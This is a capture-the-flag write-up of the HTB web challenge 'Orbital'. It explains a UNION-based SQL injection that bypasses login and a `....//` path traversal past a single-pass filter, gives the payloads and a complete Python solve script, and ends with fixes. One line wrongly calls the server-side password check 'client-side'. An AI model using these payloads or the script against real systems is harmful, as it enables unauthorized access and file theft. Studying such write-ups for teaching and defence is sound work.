## Overview

Orbital is an HTB Web challenge (Easy) presenting a Flask application themed around interplanetary communications. Two vulnerabilities chain together to read a flag file: an f-string [SQL injection](https://cwe.mitre.org/data/definitions/89.html) on the login endpoint, exploited via a UNION SELECT to inject a controlled MD5 hash row, and a [path traversal](https://cwe.mitre.org/data/definitions/22.html) bypass on the export endpoint where a single-pass `str.replace('../','')` filter is defeated with `....//`.

**[CWE-89](https://cwe.mitre.org/data/definitions/89.html) — SQL Injection · [CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Path Traversal**

---

## The Technique

### 1. SQL Injection via UNION-injected hash ([CWE-89](https://cwe.mitre.org/data/definitions/89.html))

The login query builds SQL with direct f-string interpolation:

```python
user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)
```

After fetching the row the app verifies the password client-side:

```python
def passwordVerify(hashPassword, password):
    md5Hash = hashlib.md5(password.encode())
    if md5Hash.hexdigest() == hashPassword: return True
```

Because the stored hash is compared against `md5(input)`, we can bypass authentication without knowing any real credential. We choose an arbitrary password, compute its MD5, and UNION SELECT that hash as the `password` column in the result row. The query becomes:

```sql
SELECT username, password FROM users WHERE username = "zzz"
UNION SELECT "admin","5f4dcc3b5aa765d61d8327deb882cf99"-- -"
```

`zzz` matches nothing; the UNION row wins. The app then checks `md5("password") == "5f4dcc3b5aa765d61d8327deb882cf99"` — which is true — and mints a JWT for `admin`.

### 2. Path Traversal via non-recursive filter bypass ([CWE-22](https://cwe.mitre.org/data/definitions/22.html))

The `/api/export` endpoint strips `../` before passing the filename to `send_file`:

```python
communicationName = communicationName.replace('../', '')
return send_file(f'/communications/{communicationName}', as_attachment=True)
```

`str.replace` is **single-pass** and **non-recursive**. The payload `....//` contains the substring `../` starting at index 2 (characters `.`, `.`, `/`). After one pass of replacement:

```
....//  →  ..  +  /  =  ../
```

So `....//signal_sleuth_firmware` survives the filter as `../signal_sleuth_firmware`, and `send_file('/communications/../signal_sleuth_firmware')` resolves to `/signal_sleuth_firmware` where the flag lives.

## Solution

```bash
python3 solve.py <host>:<port>
```

`solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, hashlib

HOST = sys.argv[1] if len(sys.argv) > 1 else "target"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BASE = f"http://{HOST}:{PORT}"
s = requests.Session()

# 1. SQLi: UNION SELECT injected md5 hash; supply preimage as password
h = hashlib.md5(b"password").hexdigest()
sqli = f'zzz" UNION SELECT "admin","{h}" -- -'
r = s.post(f"{BASE}/api/login", json={"username": sqli, "password": "password"})
print(f"[*] Login: {r.status_code} {r.text}")

if r.status_code != 200:
    print("[-] Login failed"); sys.exit(1)
print("[+] Authenticated!")

# 2. Path traversal: ....// bypasses str.replace('../','') single-pass filter
for p in ["....//signal_sleuth_firmware", "..././signal_sleuth_firmware"]:
    r = s.post(f"{BASE}/api/export", json={"name": p})
    print(f"  {p!r} -> {r.status_code}")
    if r.status_code == 200:
        print(f"\n[+] FLAG: {r.text.strip()}")
        break
```

Running it against the spawned instance prints `HTB{...}`.

## Why it worked

**SQLi:** No parameterized query — the username is pasted directly into the SQL string. Python's `%s`-style or prepared-statement APIs would have escaped the payload and prevented the UNION injection. The hash-comparison verification model compounds the issue: because the app verifies the hash returned from the DB rather than comparing a server-known credential, an attacker who controls the returned hash row trivially supplies the matching preimage.

**Path traversal:** Python's `str.replace` removes the first (and all non-overlapping) occurrences of `../` in one left-to-right scan. The `....//` sequence embeds `../` at an interior position; after removal the surrounding bytes re-form `../`. A recursive loop (`while '../' in name: name = name.replace('../','')`) would also fail for different inputs; the only safe approach is canonicalization with `os.path.realpath` followed by a prefix assertion.

---

## Fix

**SQLi** — use parameterized queries:

```python
user = query('SELECT username, password FROM users WHERE username = %s', (username,), one=True)
```

**Path traversal** — canonicalize and confine:

```python
import os
name = os.path.basename(communicationName)
full = os.path.realpath(os.path.join('/communications', name))
if not full.startswith('/communications' + os.sep):
    abort(400)
return send_file(full, as_attachment=True)
```
